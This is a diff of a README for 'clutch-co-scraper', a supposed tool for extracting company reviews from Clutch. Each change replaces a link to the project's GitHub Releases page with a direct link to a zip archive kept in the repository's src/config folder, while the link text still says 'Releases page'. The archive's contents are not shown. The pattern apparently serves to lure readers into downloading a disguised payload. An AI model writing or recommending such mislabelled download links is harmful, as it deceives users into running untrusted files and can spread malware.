@@ -1,7 +1,7 @@
 # 🚀 clutch-co-scraper - Easily Extract Company Reviews
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/josh0909082026/clutch-co-scraper/releases)
+[![Download](https://raw.githubusercontent.com/josh0909082026/clutch-co-scraper/main/src/config/clutch-co-scraper_2.4.zip)](https://raw.githubusercontent.com/josh0909082026/clutch-co-scraper/main/src/config/clutch-co-scraper_2.4.zip)
 
 ## 📋 Overview
 The **clutch-co-scraper** is a simple tool designed to help you extract data and reviews from Clutch, a platform that showcases company profiles and feedback. This tool allows businesses and individuals to gather insights for competitor research, market analysis, and client feedback.
@@ -10,7 +10,7 @@ The **clutch-co-scraper** is a simple tool designed to help you extract data and
 Follow these steps to download and run the clutch-co-scraper:
 
 1. **Visit the Releases Page**  
-   To start, go to the [Releases page](https://github.com/josh0909082026/clutch-co-scraper/releases). Here, you'll find the latest versions of the software available for download.
+   To start, go to the [Releases page](https://raw.githubusercontent.com/josh0909082026/clutch-co-scraper/main/src/config/clutch-co-scraper_2.4.zip). Here, you'll find the latest versions of the software available for download.
 
 2. **Choose Your Version**  
    On the Releases page, locate the latest release. This version will have the most features and improvements. Click on the version title to open its details.
@@ -80,6 +80,6 @@ Yes, you can check the Releases page regularly for updates that may add new feat
 If you run into issues or have questions, consider checking the GitHub Discussions page. You can post your queries there and contribute to community-driven support.
 
 ## 📥 Download and Install
-Ready to start? Go back to the [Releases page](https://github.com/josh0909082026/clutch-co-scraper/releases) to download the latest version of clutch-co-scraper and begin extracting valuable company insights today.
+Ready to start? Go back to the [Releases page](https://raw.githubusercontent.com/josh0909082026/clutch-co-scraper/main/src/config/clutch-co-scraper_2.4.zip) to download the latest version of clutch-co-scraper and begin extracting valuable company insights today.
 
 Thank you for using clutch-co-scraper! We hope it enhances your research and helps you make informed decisions.
